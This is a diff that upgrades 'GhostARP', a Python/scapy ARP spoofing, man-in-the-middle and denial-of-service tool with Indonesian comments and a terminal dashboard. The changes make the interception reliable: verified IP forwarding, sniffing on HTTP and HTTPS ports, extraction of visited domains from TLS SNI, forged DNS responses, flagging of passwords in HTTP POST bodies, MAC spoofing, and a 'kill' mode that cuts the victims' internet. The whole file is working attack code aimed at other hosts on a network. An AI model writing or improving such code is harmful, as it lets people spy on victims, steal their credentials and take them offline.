@@ -1,16 +1,17 @@
 #!/usr/bin/env python3
 """
-GhostARP v1.5 - ARP Spoofing / MITM / DoS wrapper
-Fitur :
-  - Multi-target (interaktif, -t a,b,c, atau file) + ADD/DEL target saat runtime
-  - Dashboard menampilkan HOST AKTIF (hasil ARP sweep) + status tiap host
-  - Perintah SCAN untuk re-sweep jaringan saat runtime
-  - Mode MITM  : internet korban tetap jalan, traffic di-sniff
-  - Mode KILL  : internet korban PUTUS total (ARP poison tanpa forwarding)
-  - DNS spoofing (mode MITM), HTTP sniffing + deteksi credential
-  - Pause/resume poisoning, ganti mode runtime, manajemen DNS map runtime
-  - Restore ARP semua target otomatis saat berhenti / target dihapus
-Requirements : scapy, rich
+GhostARP v1.6 - ARP Spoofing / MITM / DoS wrapper
+Perbaikan v1.6 (fokus: MITM tidak tampil & internet korban mati):
+  [FIX] set_ip_forward DIVERIFIKASI; gagal = peringatan keras (bukan diam-diam)
+  [FIX] Auto-detect interface memilih pemilik DEFAULT ROUTE; virtual iface disaring
+  [FIX] Validasi own_ip / subnet / gateway MAC sebelum start -> cegah poison ke MAC mati
+  [FIX] Sniffer: port default 80,443,8080,8443 + parsing TLS SNI (domain HTTPS tampil)
+  [FIX] Sniffer pakai sniff(timeout=1) loop -> berhenti bersih, error terlihat
+  [FIX] change_mac diverifikasi (MAC & IP) + rollback; interface selalu di-up
+  [FIX] gateway_mac unresolved = tolak start; guard poison sisi gateway
+  [FIX] halt_and_restore(): stop -> join poison thread -> restore (anti race ARP)
+  [FIX] Panel DNS Queries ditambahkan di dashboard ATTACK
+  [FIX] Peringatan --dead-mac hanya efektif di mode kill
 Usage        : sudo python3 ghostarp.py
                sudo python3 ghostarp.py -t 192.168.1.2,192.168.1.3 --mode kill
                sudo python3 ghostarp.py --targets-file victims.txt --mode mitm --dns-file dns.txt
@@ -59,7 +60,6 @@ try:
     from rich.console import Console, Group
     from rich.live import Live
     from rich.panel import Panel
-    from rich.prompt import Confirm, IntPrompt, Prompt
     from rich.table import Table
     from rich.text import Text
 except ImportError as e:
@@ -74,6 +74,7 @@ POISON_INTERVAL = 2.0   # detik antar poison
 RESTORE_COUNT = 5       # jumlah ARP restore saat exit
 RESTORE_COUNT_FAST = 3  # jumlah ARP restore saat del target (runtime)
 HOSTS_DISPLAY_MAX = 20  # maks host yang dirender di dashboard
+DEAD_MAC_STR = "00:00:00:00:00:00"
 
 BANNER = r"""
 [bold cyan]
@@ -83,7 +84,7 @@ BANNER = r"""
 | |_| | | | (_| | |_| |_| | / ___ \|  __/|  __/ 
  \____|_| |_|\__,_|\__|\____|/_/   \_\_|   |_|    
 [/bold cyan]
-[bold magenta]   ARP Spoofing / MITM / DoS Framework - Dashboard Config Edition[/bold magenta]
+[bold magenta]   ARP Spoofing / MITM / DoS Framework - v1.6 (MITM Fix)[/bold magenta]
 """
 
 
@@ -101,7 +102,7 @@ def get_mac(iface: str) -> str:
         with open(f"/sys/class/net/{iface}/address") as f:
             return f.read().strip().lower()
     except Exception:
-        return "00:00:00:00:00:00"
+        return DEAD_MAC_STR
 
 
 def _ioctl_ifreq(iface: str, req: int) -> str:
@@ -132,10 +133,10 @@ def get_ip(iface: str) -> str:
 
 def get_netmask(iface: str) -> str:
     try:
-        from scapy.all import conf
         for dev in conf.ifaces.values():
             if dev.name == iface or dev.pcap_name == iface:
-                return dev.netmask
+                if dev.netmask:
+                    return dev.netmask
     except Exception:
         pass
     try:
@@ -148,12 +149,13 @@ def get_network(iface: str) -> ipaddress.IPv4Network:
     return ipaddress.IPv4Network(f"{get_ip(iface)}/{get_netmask(iface)}", strict=False)
 
 
-def get_default_gateway() -> Optional[str]:
+def get_default_gateway(iface: Optional[str] = None) -> Optional[str]:
+    """Ambil gateway default. Kalau iface diberikan, cari route via iface itu dulu."""
     try:
-        from scapy.all import conf
-        gw = conf.route.route("0.0.0.0")[2]
-        if gw and gw != "0.0.0.0":
-            return gw
+        for dst in ("0.0.0.0", "8.8.8.8"):
+            r_iface, _, gw = conf.route.route(dst)
+            if gw and gw != "0.0.0.0" and (iface is None or r_iface == iface):
+                return gw
     except Exception:
         pass
     try:
@@ -167,19 +169,36 @@ def get_default_gateway() -> Optional[str]:
     return None
 
 
+def default_route_iface() -> Optional[str]:
+    """Interface pemegang default route — kandidat terbaik untuk MITM."""
+    try:
+        r_iface, _, _ = conf.route.route("0.0.0.0")
+        if r_iface and r_iface != "lo":
+            return r_iface
+    except Exception:
+        pass
+    return None
+
+
+_VIRT_PREFIXES = ("docker", "veth", "br-", "virbr", "lo", "vmnet",
+                  "tap", "tun", "vlan", "bond", "dummy")
+
+
 def list_up_interfaces() -> List[str]:
     out = []
     try:
-        from scapy.all import conf
         for dev in conf.ifaces.values():
-            if hasattr(dev, 'ip') and dev.ip and dev.ip != "127.0.0.1" and dev.ip != "0.0.0.0":
-                out.append(dev.name)
+            name = dev.name or ""
+            ip = getattr(dev, 'ip', None) or ""
+            if (ip and ip not in ("127.0.0.1", "0.0.0.0")
+                    and not name.startswith(_VIRT_PREFIXES)):
+                out.append(name)
     except Exception:
         pass
     if not out:
         try:
             for iface in sorted(os.listdir("/sys/class/net")):
-                if iface == "lo":
+                if iface == "lo" or iface.startswith(_VIRT_PREFIXES):
                     continue
                 try:
                     with open(f"/sys/class/net/{iface}/operstate") as f:
@@ -202,12 +221,16 @@ def get_ip_forward() -> str:
         return "0"
 
 
-def set_ip_forward(enabled: bool) -> None:
+def set_ip_forward(enabled: bool) -> bool:
+    """Aktifkan/nonaktifkan forwarding DAN verifikasi hasilnya.
+    Return False = gagal (mode MITM TIDAK berfungsi -> internet korban mati)."""
+    want = "1" if enabled else "0"
     try:
         with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
-            f.write("1" if enabled else "0")
+            f.write(want)
+        return get_ip_forward() == want
     except Exception:
-        pass
+        return False
 
 
 def random_mac() -> str:
@@ -217,11 +240,14 @@ def random_mac() -> str:
 
 
 def change_mac(iface: str, mac: str) -> None:
+    """Ganti MAC. Interface SELALU di-up kembali walau gagal (finally)."""
     if WINDOWS:
         return
-    subprocess.run(["ip", "link", "set", iface, "down"], check=True)
-    subprocess.run(["ip", "link", "set", iface, "address", mac], check=True)
-    subprocess.run(["ip", "link", "set", iface, "up"], check=True)
+    try:
+        subprocess.run(["ip", "link", "set", iface, "down"], check=True)
+        subprocess.run(["ip", "link", "set", iface, "address", mac], check=True)
+    finally:
+        subprocess.run(["ip", "link", "set", iface, "up"])
 
 
 def resolve_mac(ip: str, iface: str, timeout: float = 3.0) -> Optional[str]:
@@ -276,6 +302,53 @@ def load_spoof_map(path: Optional[str] = None, pairs_str: Optional[str] = None) 
                 d, ip = pair.split("=", 1)
                 m[d.strip().lower().rstrip(".")] = ip.strip()
     return m
+
+
+def parse_tls_sni(data: bytes) -> Optional[str]:
+    """Ekstrak domain (SNI) dari TLS ClientHello pertama.
+    Body tetap terenkripsi, tapi domain yang dikunjungi korban tetap terlihat."""
+    try:
+        if len(data) < 5 or data[0] != 0x16:        # handshake record
+            return None
+        hs = data[5:]
+        if len(hs) < 4 or hs[0] != 0x01:            # ClientHello
+            return None
+        body_len = int.from_bytes(hs[1:4], "big")
+        body = hs[4:4 + body_len]
+        if len(body) < 34:
+            return None
+        off = 34                                    # version(2) + random(32)
+        if off >= len(body):
+            return None
+        sid_len = body[off]
+        off += 1 + sid_len
+        if off + 2 > len(body):
+            return None
+        cs_len = int.from_bytes(body[off:off + 2], "big")
+        off += 2 + cs_len
+        if off >= len(body):
+            return None
+        comp_len = body[off]
+        off += 1 + comp_len
+        if off + 2 > len(body):
+            return None
+        ext_total = int.from_bytes(body[off:off + 2], "big")
+        off += 2
+        end = min(off + ext_total, len(body))
+        while off + 4 <= end:
+            etype = int.from_bytes(body[off:off + 2], "big")
+            elen = int.from_bytes(body[off + 2:off + 4], "big")
+            off += 4
+            if etype == 0:                          # server_name extension
+                if off + 5 > end:
+                    return None
+                name_len = int.from_bytes(body[off + 3:off + 5], "big")
+                name = body[off + 5:off + 5 + name_len]
+                return name.decode("utf-8", errors="ignore")
+            off += elen
+    except Exception:
+        pass
+    return None
 
 
 # --------------------------------------------------------------------------
@@ -339,7 +412,7 @@ def parse_targets_cli(target_str: Optional[str], target_file: Optional[str], ifa
                             ips.append(valid_ip(t))
         except Exception as e:
             console.print(f"[red][!] Gagal membaca file target: {e}[/]")
-    
+
     victims = []
     for ip in sorted(list(set(ips))):
         console.print(f"[*] Resolving MAC untuk target CLI: {ip}...")
@@ -360,7 +433,7 @@ class State:
     creds: int = 0
     log: List[Tuple[str, str, str]] = field(default_factory=list)         # (ts, msg, style)
     _lock: threading.Lock = field(default_factory=threading.Lock)
-    
+
     # Configuration State (Dashboard Setup Mode)
     status: str = "SETUP"  # "SETUP" | "ATTACKING"
     iface: str = ""
@@ -374,10 +447,11 @@ class State:
     mac_spoof: bool = False
     dns_file: str = ""
     dns_spoof_map: Dict[str, str] = field(default_factory=dict)
-    
+    sniff_ports: List[int] = field(default_factory=lambda: [80, 443, 8080, 8443])
+
     # Active targets (while in SETUP or ATTACKING)
     victims: List[Victim] = field(default_factory=list)
-    
+
     # Scanned hosts from background ARP sweeps
     scanned_hosts: List[Tuple[str, str]] = field(default_factory=list)
     scanning: bool = False
@@ -409,7 +483,6 @@ def background_scan(state: State) -> None:
         state.add_log(f"Scan: ARP sweep pada {state.net}...", "yellow")
         try:
             found = arp_sweep(state.iface, state.net)
-            # Filter own IP
             found = [h for h in found if h[0] != state.own_ip]
             with state._lock:
                 state.scanned_hosts = found
@@ -460,13 +533,19 @@ class ArpSpoof:
         self.mode = mode                        # "mitm" | "kill"  (bisa diganti runtime)
         self.dead_mac = dead_mac                # disimpan terpisah supaya lie_mac dinamis
         self.paused = False
-        self.sniff_ports = sniff_ports or [80, 8080]
+        self.sniff_ports = sniff_ports or [80, 443, 8080, 8443]
         self._vlock = threading.Lock()          # proteksi victims (add/del runtime)
         self._dlock = threading.Lock()          # proteksi spoof_map
         self.victims: List[Victim] = list(victims)
         self.spoof_map: Dict[str, str] = dict(spoof_map)
+        self._poison_thread: Optional[threading.Thread] = None
         bpf = "udp port 53" + "".join(f" or tcp port {p}" for p in self.sniff_ports)
         self._bpf = bpf
+
+        if not self.our_mac or self.our_mac == DEAD_MAC_STR:
+            state.add_log(
+                "PERINGATAN: MAC sendiri tidak valid — poison akan memakai MAC mati "
+                "dan MITM TIDAK berfungsi!", "red")
 
     @property
     def lie_mac(self) -> bool:
@@ -486,24 +565,35 @@ class ArpSpoof:
 
     # -- ARP poisoning ----------------------------------------------------
     def _poison_mac(self) -> str:
-        return "00:00:00:00:00:00" if self.lie_mac else self.our_mac
+        return DEAD_MAC_STR if self.lie_mac else self.our_mac
+
+    def _gateway_ok(self) -> bool:
+        return bool(self.gateway_mac) and self.gateway_mac != DEAD_MAC_STR
 
     def send_poison(self) -> None:
         lie = self._poison_mac()
+        gw_ok = self._gateway_ok()
+        if not gw_ok:
+            self.state.add_log(
+                "Gateway MAC belum ter-resolve — poison sisi gateway dilewati "
+                "(MITM tidak sempurna; internet korban bisa ikut mati)", "red")
         for v in self.victims_snapshot():
             try:
                 # Victim <- "gateway ada di MAC <lie>"
                 p1 = Ether(src=self.our_mac, dst=v.mac) / ARP(
                     op=2, psrc=self.gateway_ip, pdst=v.ip,
                     hwsrc=lie, hwdst=v.mac)
-                # Gateway <- "victim ada di MAC <lie>"
-                p2 = Ether(src=self.our_mac, dst=self.gateway_mac) / ARP(
-                    op=2, psrc=v.ip, pdst=self.gateway_ip,
-                    hwsrc=lie, hwdst=self.gateway_mac)
-                sendp([p1, p2], iface=self.iface, verbose=0)
-                v.packets += 2
-            except Exception:
-                pass
+                sendp(p1, iface=self.iface, verbose=0)
+                v.packets += 1
+                if gw_ok:
+                    # Gateway <- "victim ada di MAC <lie>"
+                    p2 = Ether(src=self.our_mac, dst=self.gateway_mac) / ARP(
+                        op=2, psrc=v.ip, pdst=self.gateway_ip,
+                        hwsrc=lie, hwdst=self.gateway_mac)
+                    sendp(p2, iface=self.iface, verbose=0)
+                    v.packets += 1
+            except Exception as e:
+                self.state.add_log(f"Poison {v.ip} error: {e}", "red")
 
     def _poison_loop(self) -> None:
         while not self.stop.is_set():
@@ -558,7 +648,7 @@ class ArpSpoof:
             self.victims.remove(v)
             with state._lock:
                 state.victims = list(self.victims)
-        
+
         def do_restore():
             self.restore_target(v, count=RESTORE_COUNT_FAST)
         threading.Thread(target=do_restore, daemon=True).start()
@@ -570,7 +660,11 @@ class ArpSpoof:
             state.add_log("mode harus: mitm | kill", "red")
             return
         self.mode = mode
-        set_ip_forward(mode == "mitm")
+        ok = set_ip_forward(mode == "mitm")
+        if mode == "mitm" and not ok:
+            state.add_log(
+                "PERINGATAN: gagal mengaktifkan ip_forward — mode MITM tidak akan "
+                "memberi internet ke korban!", "red")
         self.send_poison()   # refresh cache korban segera
         state.add_log(f"Mode -> {mode.upper()} (forward {'AKTIF' if mode == 'mitm' else 'NONAKTIF'})",
                       "green")
@@ -607,7 +701,8 @@ class ArpSpoof:
         for domain, target in self.spoof_snapshot().items():
             if qname == domain or qname.endswith("." + domain):
                 try:
-                    resp = (Ether(src=self.our_mac, dst=pkt[Ether].src) /
+                    src_mac = pkt[Ether].src if pkt.haslayer(Ether) else "ff:ff:ff:ff:ff:ff"
+                    resp = (Ether(src=self.our_mac, dst=src_mac) /
                             IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                             UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
                             DNS(id=pkt[DNS].id, qr=1, aa=1,
@@ -627,14 +722,25 @@ class ArpSpoof:
         try:
             ts = time.strftime("%H:%M:%S")
 
-            # HTTP requests (port 80/8080 dst)
-            if (pkt.haslayer(TCP) and pkt.haslayer(Raw)
-                    and pkt[TCP].dport in self.sniff_ports):
-                payload = bytes(pkt[Raw].load).decode("utf-8", errors="ignore")
-                lines = payload.split("\r\n")
+            # HTTP requests (plaintext) + TLS ClientHello (SNI)
+            if pkt.haslayer(TCP) and pkt.haslayer(Raw) \
+                    and pkt[TCP].dport in self.sniff_ports:
+                payload = bytes(pkt[Raw].load)
+                if pkt[TCP].dport == 443:
+                    sni = parse_tls_sni(payload)
+                    if sni:
+                        url = f"https://{sni}/"
+                        src = pkt[IP].src
+                        with self.state._lock:
+                            self.state.http.append((ts, src, "TLS", url))
+                            del self.state.http[:-40]
+                    return
+                text = payload.decode("utf-8", errors="ignore")
+                lines = text.split("\r\n")
                 if lines and lines[0].split(" ")[0] in ("GET", "POST", "PUT", "HEAD",
                                                         "OPTIONS", "DELETE", "PATCH", "CONNECT"):
-                    method, path = lines[0].split(" ")[0], lines[0].split(" ")[1]
+                    parts0 = lines[0].split(" ")
+                    method, path = parts0[0], parts0[1] if len(parts0) > 1 else "/"
                     host = next((h.split(":", 1)[1].strip() for h in lines
                                  if h.lower().startswith("host:")), "")
                     url = f"http://{host}{path}" if host else path
@@ -642,8 +748,8 @@ class ArpSpoof:
                     with self.state._lock:
                         self.state.http.append((ts, src, method, url))
                         del self.state.http[:-40]
-                    if method == "POST" and "\r\n\r\n" in payload:
-                        body = payload.split("\r\n\r\n", 1)[1]
+                    if method == "POST" and "\r\n\r\n" in text:
+                        body = text.split("\r\n\r\n", 1)[1]
                         if any(k in body.lower() for k in ("password", "passwd", "login", "user")):
                             with self.state._lock:
                                 self.state.creds += 1
@@ -663,37 +769,59 @@ class ArpSpoof:
             pass
 
     def _sniff_loop(self) -> None:
-        try:
-            sniff(iface=self.iface, prn=self._packet_cb, store=False,
-                  filter=self._bpf, stop_filter=lambda p: self.stop.is_set())
-        except Exception as e:
-            self.state.add_log(f"Sniffer error: {e}", "red")
+        """Sniff dengan timeout=1 per iterasi supaya berhenti bersih saat stop.
+        Kalau BPF/iface bermasalah, error muncul di log (tidak diam-diam)."""
+        while not self.stop.is_set():
+            try:
+                sniff(iface=self.iface, prn=self._packet_cb, store=False,
+                      filter=self._bpf, timeout=1)
+            except Exception as e:
+                self.state.add_log(f"Sniffer error: {e}", "red")
+                time.sleep(1)
 
     def start(self) -> None:
-        threading.Thread(target=self._poison_loop, daemon=True).start()
+        self._poison_thread = threading.Thread(target=self._poison_loop, daemon=True)
+        self._poison_thread.start()
         threading.Thread(target=self._sniff_loop, daemon=True).start()
         mode_label = "KILL (internet terputus)" if self.mode == "kill" else "MITM (sniff)"
         self.state.add_log(
             f"Attack {mode_label} dimulai pada {len(self.victims)} target", "green")
 
-    def restore_target(self, v: Victim, count: int = RESTORE_COUNT) -> None:
+    def halt_and_restore(self) -> None:
+        """Stop poison loop DULU (join), baru restore ARP — mencegah race
+        di mana burst poison terakhir merusak paket restore."""
+        self.stop.set()
+        if self._poison_thread:
+            self._poison_thread.join(timeout=POISON_INTERVAL * 2 + 1)
+        self.restore()
+
+    def restore_target(self, v: Victim, count: int = RESTORE_COUNT,
+                       gw: Optional[str] = None) -> None:
+        gw = gw or self.gateway_mac
+        if not gw or gw == DEAD_MAC_STR:
+            return  # tidak bisa restore pakai MAC mati
         for _ in range(count):
             try:
-                sendp(Ether(src=self.gateway_mac, dst=v.mac) / ARP(
+                sendp(Ether(src=gw, dst=v.mac) / ARP(
                     op=2, psrc=self.gateway_ip, pdst=v.ip,
-                    hwsrc=self.gateway_mac, hwdst=v.mac),
+                    hwsrc=gw, hwdst=v.mac),
                     iface=self.iface, verbose=0)
-                sendp(Ether(src=v.mac, dst=self.gateway_mac) / ARP(
+                sendp(Ether(src=v.mac, dst=gw) / ARP(
                     op=2, psrc=v.ip, pdst=self.gateway_ip,
-                    hwsrc=v.mac, hwdst=self.gateway_mac),
+                    hwsrc=v.mac, hwdst=gw),
                     iface=self.iface, verbose=0)
             except Exception:
                 pass
             time.sleep(0.3)
 
     def restore(self) -> None:
+        gw = self.gateway_mac
+        if not gw or gw == DEAD_MAC_STR:
+            gw = resolve_mac(self.gateway_ip, self.iface) or gw
+            if gw:
+                self.gateway_mac = gw
         for v in self.victims_snapshot():
-            self.restore_target(v, count=RESTORE_COUNT)
+            self.restore_target(v, count=RESTORE_COUNT, gw=gw)
         self.state.add_log(f"ARP cache {len(self.victims)} target & gateway di-restore", "green")
 
 
@@ -710,8 +838,8 @@ def handle_cmd(state: State, cmd: str, attack_ref: List[Optional[ArpSpoof]], sto
     # Global exit commands
     if c in ("quit", "exit", "q", "x"):
         if state.status == "ATTACKING" and attack_ref[0]:
-            attack_ref[0].stop.set()
-            state.add_log("Menghentikan attack...", "yellow")
+            state.add_log("Menghentikan attack & restore ARP...", "yellow")
+            attack_ref[0].halt_and_restore()
         stop_event.set()
         state.add_log("Perintah berhenti diterima - exit...", "yellow")
         return
@@ -738,8 +866,11 @@ def handle_cmd(state: State, cmd: str, attack_ref: List[Optional[ArpSpoof]], sto
                 state.own_ip = get_ip(val)
                 state.own_mac = get_mac(val)
                 state.net = get_network(val)
-                state.gateway_ip = get_default_gateway() or "192.168.1.1"
+                state.gateway_ip = get_default_gateway(val) or "192.168.1.1"
                 state.gateway_mac = ""
+                state._orig_mac = state.own_mac
+                if state.own_ip in ("0.0.0.0", "127.0.0.1", ""):
+                    state.add_log(f"Interface {val} tidak punya IP valid — MITM tidak akan jalan!", "red")
                 background_resolve_gateway(state)
                 background_scan(state)
                 state.add_log(f"Interface diubah ke {val} (IP: {state.own_ip}, Net: {state.net})", "green")
@@ -823,7 +954,7 @@ def handle_cmd(state: State, cmd: str, attack_ref: List[Optional[ArpSpoof]], sto
                             state.add_log(f"Indeks host {tok} tidak valid", "red")
                 else:
                     target_ip = valid_ip(tok)
-                
+
                 if target_ip:
                     if target_ip == state.own_ip:
                         state.add_log("Tidak bisa menarget IP sendiri", "red")
@@ -834,7 +965,7 @@ def handle_cmd(state: State, cmd: str, attack_ref: List[Optional[ArpSpoof]], sto
                     if any(v.ip == target_ip for v in state.victims):
                         state.add_log(f"{target_ip} sudah ada di target", "yellow")
                         continue
-                    
+
                     def resolve_and_add(ip):
                         state.add_log(f"Resolving MAC untuk target {ip}...", "yellow")
                         mac = resolve_mac(ip, state.iface)
@@ -844,7 +975,7 @@ def handle_cmd(state: State, cmd: str, attack_ref: List[Optional[ArpSpoof]], sto
                             state.add_log(f"[+] Target ditambahkan: {ip} ({mac})", "green")
                         else:
                             state.add_log(f"Gagal resolve MAC {ip} (no ARP response)", "red")
-                    
+
                     threading.Thread(target=resolve_and_add, args=(target_ip,), daemon=True).start()
 
         elif c == "del":
@@ -871,7 +1002,7 @@ def handle_cmd(state: State, cmd: str, attack_ref: List[Optional[ArpSpoof]], sto
                                 state.add_log(f"Indeks {tok} tidak valid", "red")
                     else:
                         target_ip = valid_ip(tok)
-                    
+
                     if target_ip:
                         with state._lock:
                             v = next((x for x in state.victims if x.ip == target_ip), None)
@@ -885,42 +1016,63 @@ def handle_cmd(state: State, cmd: str, attack_ref: List[Optional[ArpSpoof]], sto
             background_scan(state)
 
         elif c in ("start", "run", "attack"):
+            # ---- Validasi prasyarat MITM (mencegah "internet ikut mati") ----
             if not state.victims:
                 state.add_log("Gagal: Belum ada target ditambahkan. Gunakan 'add <ip_or_num>'", "red")
+                return
+            if not state.iface:
+                state.add_log("Gagal: Interface belum ditentukan (set iface <name>)", "red")
+                return
+            if state.own_ip in ("", "0.0.0.0", "127.0.0.1"):
+                state.add_log(f"Gagal: Interface {state.iface} tidak punya IP valid "
+                              f"({state.own_ip}). MITM tidak akan berfungsi.", "red")
                 return
             if not state.gateway_ip:
                 state.add_log("Gagal: Gateway IP belum ditentukan", "red")
                 return
-            if not state.gateway_mac:
-                # Coba resolve sinkron sekali
+            if not state.gateway_mac or state.gateway_mac == DEAD_MAC_STR:
                 state.add_log("Resolving MAC gateway...", "yellow")
                 mac = resolve_mac(state.gateway_ip, state.iface)
                 if mac:
                     state.gateway_mac = mac
                     state.add_log(f"Gateway resolved: {state.gateway_ip} -> {mac}", "green")
                 else:
-                    state.add_log(f"Gagal: MAC gateway {state.gateway_ip} tidak respon ARP", "red")
+                    state.add_log(f"Gagal: MAC gateway {state.gateway_ip} tidak respons ARP. "
+                                  f"MITM TIDAK akan jalan (internet korban bisa ikut mati).", "red")
                     return
-            
+
             state.add_log("Mempersiapkan attack...", "yellow")
-            
-            # MAC Spoofing
+
+            # ---- MAC Spoofing dengan verifikasi + rollback ----
             state.own_mac = get_mac(state.iface)
+            state._orig_mac = state.own_mac
             if state.mac_spoof:
                 new_mac = random_mac()
                 state.add_log(f"Spoofing MAC: {state.own_mac} -> {new_mac}", "yellow")
                 try:
                     change_mac(state.iface, new_mac)
-                    state.own_mac = new_mac
+                    state.own_mac = get_mac(state.iface)
+                    if state.own_mac != new_mac:
+                        state.add_log("Gagal ubah MAC — batal attack & rollback", "red")
+                        try:
+                            change_mac(state.iface, state._orig_mac)
+                        except Exception:
+                            pass
+                        return
                 except Exception as e:
-                    state.add_log(f"Gagal ubah MAC: {e}", "red")
+                    state.add_log(f"Gagal ubah MAC: {e} — batal attack", "red")
+                    return
 
-            # Save forward state
+            # ---- Aktifkan ip_forward DENGAN verifikasi ----
             state._orig_fwd = get_ip_forward()
-            set_ip_forward(state.mode == "mitm")
-            
+            if not set_ip_forward(state.mode == "mitm"):
+                state.add_log("PERINGATAN: gagal set ip_forward. "
+                              "Mode MITM TIDAK memberi internet ke korban!", "red")
+                if state.mode == "mitm":
+                    state.add_log("Mode masih mitm, tapi forward mati — korban akan kehilangan "
+                                  "internet. Ketik 'mode kill' atau 'stop'.", "red")
+
             attack_stop = threading.Event()
-            sniff_ports = [80, 8080]
             attack = ArpSpoof(
                 iface=state.iface,
                 own_ip=state.own_ip,
@@ -934,9 +1086,9 @@ def handle_cmd(state: State, cmd: str, attack_ref: List[Optional[ArpSpoof]], sto
                 net=state.net,
                 mode=state.mode,
                 dead_mac=state.dead_mac,
-                sniff_ports=sniff_ports
+                sniff_ports=state.sniff_ports
             )
-            
+
             attack_ref[0] = attack
             attack.start()
             state.status = "ATTACKING"
@@ -949,17 +1101,17 @@ def handle_cmd(state: State, cmd: str, attack_ref: List[Optional[ArpSpoof]], sto
         if not attack:
             state.status = "SETUP"
             return
-        
+
         if c == "help":
             state.add_log(
-                "Attack commands: stop | pause | resume | mode mitm|kill | add <ip|num> | del <ip|num|all> | scan | dns add d=ip | dns del d | quit",
+                "Attack commands: stop | pause | resume | mode mitm|kill | add <ip|num> | del <ip|num|all> | "
+                "scan | dns add d=ip | dns del d | quit",
                 "cyan"
             )
         elif c == "stop":
             state.add_log("Menghentikan attack & memulihkan ARP...", "yellow")
-            attack.stop.set()
-            attack.restore()
-            
+            attack.halt_and_restore()   # stop -> join poison thread -> restore
+
             # Restore MAC
             if hasattr(state, '_orig_mac') and state._orig_mac and state.own_mac != state._orig_mac:
                 try:
@@ -968,15 +1120,15 @@ def handle_cmd(state: State, cmd: str, attack_ref: List[Optional[ArpSpoof]], sto
                     state.add_log(f"MAC dipulihkan ke {state._orig_mac}", "green")
                 except Exception:
                     state.add_log("Gagal memulihkan MAC interface", "red")
-            
+
             # Restore forward
             if hasattr(state, '_orig_fwd'):
                 set_ip_forward(state._orig_fwd == "1")
-            
+
             attack_ref[0] = None
             state.status = "SETUP"
             state.add_log("Attack dihentikan. Kembali ke Setup Mode.", "green")
-            
+
         elif c == "add":
             if len(parts) < 2:
                 state.add_log("Format: add <ip_atau_indeks>", "red")
@@ -995,7 +1147,6 @@ def handle_cmd(state: State, cmd: str, attack_ref: List[Optional[ArpSpoof]], sto
                             state.add_log(f"Indeks host {tok} tidak valid", "red")
                 else:
                     target_ip = valid_ip(tok)
-                
                 if target_ip:
                     attack.add_victim(target_ip, state)
 
@@ -1022,7 +1173,6 @@ def handle_cmd(state: State, cmd: str, attack_ref: List[Optional[ArpSpoof]], sto
                                 state.add_log(f"Indeks {tok} tidak valid", "red")
                     else:
                         target_ip = valid_ip(tok)
-                    
                     if target_ip:
                         attack.del_victim(target_ip, state)
 
@@ -1079,10 +1229,10 @@ def _reader_loop(state: State, stop_event: threading.Event, inp: InputState, att
                         cmd, buf = buf, ""
                         inp.buf = ""
                         handle_cmd(state, cmd, attack_ref, stop_event)
-                    elif ch in (b'\x7f', b'\x08'):  # Backspace
+                    elif ch in (b'\x7f', b'\x08'):
                         buf = buf[:-1]
                         inp.buf = buf
-                    elif ch == b'\x03':  # Ctrl+C
+                    elif ch == b'\x03':
                         stop_event.set()
                         state.add_log("Ctrl+C - menghentikan...", "yellow")
                         break
@@ -1136,7 +1286,7 @@ def fmt_uptime(secs: float) -> str:
 
 def build_dashboard(state: State, inp: InputState, attack_ref: List[Optional[ArpSpoof]], stop_event: threading.Event) -> Panel:
     http, dns, log, creds = state.snapshot()
-    
+
     if state.status == "SETUP":
         # Info Panel Left
         info = Table.grid(padding=(0, 2))
@@ -1145,7 +1295,7 @@ def build_dashboard(state: State, inp: InputState, attack_ref: List[Optional[Arp
         info.add_row("Interface", f"[white]{state.iface}[/]  ([dim]{state.own_mac}[/])")
         info.add_row("IP / Netmask", f"[white]{state.own_ip}[/] / [dim]{state.net.netmask}[/]")
         info.add_row("Gateway IP", f"[bold yellow]{state.gateway_ip}[/]")
-        
+
         gw_mac_str = state.gateway_mac
         if not gw_mac_str:
             if state.resolving_gateway:
@@ -1155,28 +1305,29 @@ def build_dashboard(state: State, inp: InputState, attack_ref: List[Optional[Arp
         else:
             gw_mac_str = f"[green]{gw_mac_str}[/]"
         info.add_row("Gateway MAC", gw_mac_str)
-        
+
         mode_style = "red" if state.mode == "kill" else "green"
         mode_desc = "MITM (Internet OK, Sniffing ON)" if state.mode == "mitm" else "KILL (Internet BLOCKED)"
         info.add_row("Attack Mode", f"[bold {mode_style}]{mode_desc}[/]")
         info.add_row("MAC Spoofing", "[green]ENABLED[/] (Randomized on start)" if state.mac_spoof else "[dim]DISABLED[/]")
         info.add_row("DNS Spoofing", f"[yellow]{len(state.dns_spoof_map)}[/] domains active")
-        
+        info.add_row("Sniff Ports", f"[dim]{','.join(map(str, state.sniff_ports))}[/]")
+
         info_panel = Panel(info, title="[bold cyan]🔧 Configuration[/]", border_style="cyan", expand=True)
 
         # Targets Panel Left
         vt = Table(box=SIMPLE_HEAVY, header_style="bold yellow", expand=True)
         vt.add_column("IP Address", style="bold yellow")
         vt.add_column("MAC Address", style="cyan")
-        
+
         for v in state.victims:
             vt.add_row(v.ip, v.mac)
-            
+
         targets_title = f"[bold yellow]🎯 Selected Targets ({len(state.victims)})[/]"
         targets_panel = Panel(
-            vt if state.victims else Text("\n  Daftar target kosong.\n  Ketik 'add <ip_atau_nomor>' untuk menambahkan.", style="dim italic"), 
-            title=targets_title, 
-            border_style="yellow", 
+            vt if state.victims else Text("\n  Daftar target kosong.\n  Ketik 'add <ip_atau_nomor>' untuk menambahkan.", style="dim italic"),
+            title=targets_title,
+            border_style="yellow",
             expand=True
         )
 
@@ -1187,7 +1338,7 @@ def build_dashboard(state: State, inp: InputState, attack_ref: List[Optional[Arp
         ht.add_column("IP Address", style="bold yellow")
         ht.add_column("MAC Address", style="cyan")
         ht.add_column("Status")
-        
+
         target_ips = {v.ip for v in state.victims}
         for i, (ip, mac) in enumerate(hosts[:HOSTS_DISPLAY_MAX]):
             if ip == state.gateway_ip:
@@ -1197,11 +1348,11 @@ def build_dashboard(state: State, inp: InputState, attack_ref: List[Optional[Arp
             else:
                 status = "[dim]available[/]"
             ht.add_row(str(i + 1), ip, mac, status)
-            
+
         hosts_title = f"[bold green]🔍 Discovered Hosts ({len(hosts)})[/]"
         if state.scanning:
             hosts_title += " [blink yellow](Scanning...)[/]"
-            
+
         hosts_panel = Panel(
             ht if hosts else Text("\n  Tidak ada host / Belum scan.\n  Ketik 'scan' untuk memindai jaringan.", style="dim italic"),
